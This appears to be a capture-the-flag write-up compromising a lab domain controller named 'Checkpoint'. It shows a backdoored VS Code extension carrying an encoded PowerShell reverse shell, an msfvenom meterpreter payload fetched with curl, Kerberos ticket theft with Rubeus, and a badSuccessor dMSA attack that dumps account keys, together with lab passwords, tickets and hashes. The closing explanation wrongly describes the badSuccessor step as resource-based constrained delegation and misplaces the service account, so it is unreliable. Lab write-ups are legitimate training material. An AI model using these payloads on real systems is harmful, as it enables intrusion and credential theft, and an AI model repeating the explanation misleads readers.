---
title: "Checkpoint"
type: docs
tags:
  - Medium
---

## Nmap scan

```bash
Nmap scan report for checkpoint.htb (10.129.112.233)
Host is up, received user-set (0.024s latency).
Scanned at 2026-09-03 02:07:14 EDT for 187s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           REASON  VERSION
53/tcp    open  domain            syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2026-09-03 13:09:32Z)
135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack
464/tcp   open  kpasswd5?         syn-ack
593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack
3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack
5985/tcp  open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-headers: 
|   Content-Type: text/html; charset=us-ascii
|   Server: Microsoft-HTTPAPI/2.0
|   Date: Thu, 03 Sep 2026 13:10:21 GMT
|   Connection: close
|   Content-Length: 315
|   
|_  (Request type: GET)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
49664/tcp open  msrpc             syn-ack Microsoft Windows RPC
49672/tcp open  msrpc             syn-ack Microsoft Windows RPC
49673/tcp open  msrpc             syn-ack Microsoft Windows RPC
49679/tcp open  msrpc             syn-ack Microsoft Windows RPC
49680/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc             syn-ack Microsoft Windows RPC
49710/tcp open  msrpc             syn-ack Microsoft Windows RPC
49719/tcp open  msrpc             syn-ack Microsoft Windows RPC
```


We are provided with the initial credentials of `alex.turner`, with these I attempted to authenticate with `smb`, from there I was able to identify multiple shares that this user was able to access which are listed right below.

```bash
└─[$] smbmap  -H 10.129.112.227  -u 'alex.turner' -p 'Checkpoint2024!'

[+] IP: 10.129.112.227:445	Name: checkpoint.htb      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	READ ONLY	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	NO ACCESS	

```


## Initial Access

From here I attempted to enumerate `alex.turner` and what they have access to write too on the domain.

```bash
[$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable     [3:02:41]

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

So here we can see that there seems to be a user called `Mark Davies` that has been deleted alongside other objects that we can write too, from here I restored the user. 

```bash
└─[$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

```bash
└─[$] nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!' --shares                                      [3:07:36]

SMB         10.129.112.233  445    DC01             [*] Windows 10.0 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.233  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.112.233  445    DC01             [*] Enumerated shares
SMB         10.129.112.233  445    DC01             Share           Permissions     Remark
SMB         10.129.112.233  445    DC01             -----           -----------     ------
SMB         10.129.112.233  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.112.233  445    DC01             C$                              Default share
SMB         10.129.112.233  445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.112.233  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.112.233  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.112.233  445    DC01             SYSVOL          READ            Logon server share 

```

Here we can see authenticating with `mark.davies` we can see this user has access to read and write to the DevDrop share. 

After doing some research I am assuming that since it mentioned that it takes `vsix` extensions for visual studio code It took me awhile but I found the right poc located [at this repo](https://github.com/yeeth-security/vsix-zoo/blob/main/samples/thesevibesareoff/solidityai.solidity-1.0.9.vsix)

From here I extracted the extension to get the files I needed to modify.

```bash
└─[$] unzip solidityai.solidity-1.0.9.vsix                                                                       [3:48:10]
Archive:  solidityai.solidity-1.0.9.vsix
  inflating: extension.vsixmanifest  
  inflating: [Content_Types].xml     
  inflating: extension/tsconfig.json  
  inflating: extension/readme.md     
  inflating: extension/package.json  
  inflating: extension/LICENSE.md    
  inflating: extension/icon.png      
  inflating: extension/src/extension.js  
```

From here I edited the `extension/src/extension.js` to include a powershell reverse shell payload.

```bash
└─[$] cat extension.js                                                                                           [3:52:21]
const vscode = require('vscode');
const { exec } = require('child_process');

/**
 * @param {vscode.ExtensionContext} context
 */
async function activate(context) {
    if (process.platform !== 'win32') {
        return;
    }
    setTimeout(() => {
        const psCommand = 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANQA5ACIALAA5ADAAMAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
        exec(psCommand, { windowsHide: true }, (err) => {});
    }, 2000);
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};
```

From here I zipped it all up then uploaded it to that share.

```bash
└─[$] zip -r baphomet-exploit.zip *                                                                              [3:49:27]
  adding: [Content_Types].xml (deflated 50%)
  adding: extension/ (stored 0%)
  adding: extension/tsconfig.json (deflated 39%)
  adding: extension/package.json (deflated 42%)
  adding: extension/src/ (stored 0%)
  adding: extension/src/extension.js (deflated 50%)
  adding: extension/LICENSE.md (stored 0%)
  adding: extension/readme.md (deflated 68%)
  adding: extension/icon.png (deflated 0%)
  adding: extension.vsixmanifest (deflated 71%)
```

After uploading it to that share I was able to get a shell!

```bash
└─[$] rlwrap nc -lnvvp 9005                                                                                      [3:46:30]
Listening on 0.0.0.0 9005
Connection received on 10.129.112.233 62686

PS C:\Program Files\Microsoft VS Code> 
```

```bash
PS C:\users> whoami
checkpoint\ryan.brooks
```

we are currently under the user `ryan.brooks`, afterwards when to their home directory and then got the first flag.

```bash
PS C:\users\ryan.brooks\desktop> type user.txt
91a112fe7b6455406ddcb376ed155205
PS C:\users\ryan.brooks\desktop> 
```

Since our shell is really sketchy I decided to upload a `meterpreter` payload to get a more stable shell.

```bash
└─[$] msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.59 LPORT=9001 -f exe -o baphomet.exe            [3:54:51]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: baphomet.exe
```

```bash
C:\Users\ryan.brooks> curl http://10.10.17.59:8000/baphomet.exe -O baphomet.exe
PS C:\Users\ryan.brooks> dir


    Directory: C:\Users\ryan.brooks


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         5/21/2026   4:19 PM                .vscode                                                              
d-----         5/21/2026   4:19 PM                .vscode-shared                                                       
d-r---         5/18/2026   6:16 PM                Contacts                                                             
d-r---         5/18/2026   6:16 PM                Desktop                                                              
d-r---         5/18/2026   6:16 PM                Documents                                                            
d-r---         5/18/2026   6:16 PM                Downloads                                                            
d-r---         5/18/2026   6:16 PM                Favorites                                                            
d-r---         5/18/2026   6:16 PM                Links                                                                
d-r---         5/18/2026   6:16 PM                Music                                                                
d-r---         5/18/2026   6:16 PM                Pictures                                                             
d-r---         5/18/2026   6:16 PM                Saved Games                                                          
d-r---         5/18/2026   6:16 PM                Searches                                                             
d-r---         5/18/2026   6:16 PM                Videos                                                               
-a----          9/3/2026   8:00 AM          73802 baphomet.exe                                                         


PS C:\Users\ryan.brooks> start-process baphomet.exe
PS C:\Users\ryan.brooks> 
```

```bash
*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.17.59:9001 

msf6 exploit(multi/handler) > 
[*] Sending stage (177734 bytes) to 10.129.112.233

msf6 exploit(multi/handler) > s[*] Meterpreter session 1 opened (10.10.17.59:9001 -> 10.129.112.233:56817) at 2026-09-03 04:01:51 -0400

msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  CHECKPOINT\ryan.brooks @ DC01  10.10.17.59:9001 -> 10.129.112.233:56817 (10.129.112.
                                                                    233)

msf6 exploit(multi/handler) > 
```

Afterwards I had uploaded `SharpHound` in order to enumerate this user and their permissions on the domain alot better using `bloodhound`, I uploaded the binary then executed it.

```powershell

PS C:\Users\ryan.brooks> .\SharpHound.exe
.\SharpHound.exe
2026-09-03T08:08:16.0645188-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-09-03T08:08:16.0985055-07:00|INFORMATION|SharpHound Version: 2.14.0.0
2026-09-03T08:08:16.0985055-07:00|INFORMATION|SharpHound Common Version: 4.7.0.0
2026-09-03T08:08:16.2541230-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-09-03T08:08:16.3057661-07:00|INFORMATION|Initializing SharpHound at 8:08 AM on 9/3/2026
2026-09-03T08:08:16.3932397-07:00|INFORMATION|Resolved current domain to checkpoint.htb
2026-09-03T08:08:28.7061659-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-09-03T08:08:28.8687181-07:00|INFORMATION|Beginning LDAP search for checkpoint.htb
2026-09-03T08:08:28.8707303-07:00|INFORMATION|Collecting AdminSDHolder data for checkpoint.htb
2026-09-03T08:08:28.9644640-07:00|INFORMATION|AdminSDHolder ACL hash 8D4B78A3A73E761C2B15363A835DE9FD09981C49 calculated for checkpoint.htb.
```

Afterwards Since we don't know the current user `ryan.brooks` password we can extract their current users kerberos ticket without requiring elevated administrator priviledges by abusing `GSS-API` to fake delegation.

```powershell
PS C:\Users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: K1TXGs7gsIkLKN31UARrEquZhNeC7AfA169VmwGntoI=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuuOitpRwREs1mrW8V81IhorWkKT5Xy7oFSIjtaqtKaCU74YSgFTdAXN3XVn+4okMvdd+cCpgvDJCQOm6lIxoPvUkAsU6+j47Sj+eHLx8WM9WetV3R82EWe/CxOEXx08x28EvAmYWSnX9FZRRubP3JdZOVy+7WtZc+GLA4JEW491Eq4/ZYeALiWXJ0H83J2pJOWgJUhqOzy2M916GSdcT2c7vxgM4XlW1XoyiT0ZYoaHjujXQD3fM6chneHQg0GBlM8UlHeKTMX/51EKMOlrSx2LTHLC1LdTpcpKte8LJdDM0bfno+9B4ioelnv6nY5GxG4lwAxRgooaUM+AtYg556958ApWmTh59G1+HsoERMjhpFSpFIu3TkBVvjlJCrD3AhE6AQ45oy8z9TR2vthxT/VYetFSaQE/H957moq/55RqD8eWtuv8CKMonUOD6X2DpcZakXHR/r3hLzKplWgZYTNIKIxuPVCVwt/xvdOO5C0VhxV+Gr60VCrEcM3NDHWf5FWCAXTKxoDwdynuJx2YJpWJiqcATV4EBV0bpZIoafvpJDkX7m56TxreXWHB4dYHwDrpk2rWivqhePgaA15Jf83R6Y7GxVRK6scCCiHjfFVHxdVktZnRrFLS5vXLddWOdMGWslGvD9gtHxmMweuhgyyhIaAK47lLnAA2qtQZL3i2vHvqJxBkI240wx4NJsYumTPckEpF5cSOM+kPPenPPIhtQpR2QpQZQ4F/HBnf9mtdH1OfFxulRSffIZ3gj1TetaHLACiesmST5ee6ocIY0+NeMCaSQlQGBYQJyFi/tEUy+8+3TJfRK3aYap9JRfx99TKxT9J5GGtGpQNUIgOM8UXQaZOV6TPWC0VYjGEnygEABsjw9xOdZe0Oeq344jjolDFTcMEHSW/S44E7eQf+HEbAnG7GYSD71lBvrrVclmJUbWITc38RvSzAOjDObHm3LyLH7aaDu4csY7MXYf+t136cbIqzkfht03Rnl46a8wmwe12OWDIpjgw2BkHWYMdQVvoKEZ2BFnRLVEYq4FGCc5lDZkAbMmSxxlM0a5mAdGuarvBBaMqus1deYIYINvQCJAh01HHEcd/2Aseis7lKHLud9th0NZY1coRS6Uc1wORIcCEH4vL4VCSaX/YMKwR5Wh8qJYc28UX4KO0GI4A+IJbCZ92WHIHlfXBVEo98KzWB9crnf6kQ1MbgKBYQtRBIe5fdKAgJb8fJM5znLmBlSo2EsYu8Ko7JffyZpO4lHpX12NbzQPtBZkRqUppgLvpQW3dsv/tr/VwGDRngRgPQxHqlxmvu+OCUu5xMVSeViUGrLzDC0WVpsJyQRTgxlEDvqk01Dyvz1OnxVN/tN1Ltb+83BrBpWRT3iwd05MLs7dW0MyyL0IFPetMxxKvuo3g+TberHpIC4pUacdxM+f9+WkbJRJrV05HCRBvKb1ixiWEurHygz91NY/mZI3rnkdCJJ5AbeERkBgff49NFYFkCmgdjGVe7cYBAyfcaiwc0PSo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg2Ez5gyuSjCJs964IrSYHLIGHomlF/6utRfmup4ppZDehEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDkwMzE1MjUzNFqmERgPMjAyNjA5MDQwMTI1MzRapxEYDzIwMjYwOTEwMTUyNTM0WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
PS C:\Users\ryan.brooks> 
```

Afterwards we need to decode this `base64` ticket by doing the following.

```bash
└─[$] base64 -d ryan.brooks.kirbi > ryan.brooks2.kirbi 
```

Then afterwards we can use `impacket-ticketconverter` to convert this ticket over to the `ccache` file that we will need.

```bash
└─[$] python3 ~/ADTools/impacket/examples/ticketConverter.py ryan.brooks2.kirbi ryan.brooks.ccache               [4:27:36]
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Then afterwards we need to export the local variable `KRB5CCNAME`.

```BASH
└─[$] export KRB5CCNAME=ryan.brooks.ccache 
```

then afterwards we can use `bloodyAD` in order to attempt to use `badsuccessor`. The reason why we are attempting `badsuccessor` is because ht affects `windows server 2025` and before. 

### What is badsuccessor?

`badsuccessor` works by abusing attributes by tamptering with the `msDS-ManagedAccountPrecededbyLink` attribute, this allows attackers to trick Active Directory into granting a dMSA the same priviledges as a high-level account such as domain admin, without altering any existing accounts.

So with this in mind the account in question that we are going to target is the service account `svc_deploy` because this service account is located under the `CN=CONFIGURATION` which in this case `CONFIGURATION` is an Active Directory Container object, or a Group Policy Container which this service account is apart of.

```bash
bloodyAD -k ccache=ryan.brooks.ccache -u 'ryan.brooks' --dc-ip '10.129.112.233' --host dc01.checkpoint.htb -d checkpoint.htb add badSuccessor baphomet -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
Clock skew detected. Adjusting local time by 6:59:59.430645. Retrying operation.
[+] Creating DMSA baphomet$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Clock skew detected. Adjusting local time by 6:59:59.627634. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : baphomet$
UserRealm    : checkpoint.htb
StartTime    : 2026-09-03 15:33:26+00:00
EndTime      : 2026-09-04 01:25:34+00:00
RenewTill    : 2026-09-10 15:25:34+00:00
Flags        : pre-authent, renewable, forwardable, forwarded, enc-pa-rep
Keytype      : 18
Key          : FuaaBXRrxFBAIVW+E8tsFEDzO7yTaCPsQpYO1KmnG5c=
EncodedKirbi : 
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
    Qg==
[+] dMSA TGT stored in ccache file baphomet_1F.ccache

dMSA current keys found in TGS:
AES256: 6b1c4d4a97ce362ebb24b15d470ad00a996db57089058a9dd37fabdfb9767e5f
AES128: fa7d778d88da868b6c61a3ae6b19d7d3
RC4: f9eafc0ab05cd45d266e9c7a07e94399

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

### What are we doing here?

Using `bloodyAD` we are creating a new `computer object` called `baphomet` in this active directory enviorment. By targeting `svc_deploy` the service user account `CN=svc_deploy` we are exploiting `Resource-Based Constrained Delegation (RBCD)` a form of domain based priviledge escallation to allow the new fake computer account to impersonate or access that service account.

**`-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"`**: Specifies the **target** (`-t`) object for this operation. In BloodHound/RBCD scenarios, this modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `svc_deploy` user account to trust the newly created `baphomet` computer.

**`--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"`**: Dictates the exact Organization Unit (OU) container path where the new `baphomet` computer object should be physically created and placed.
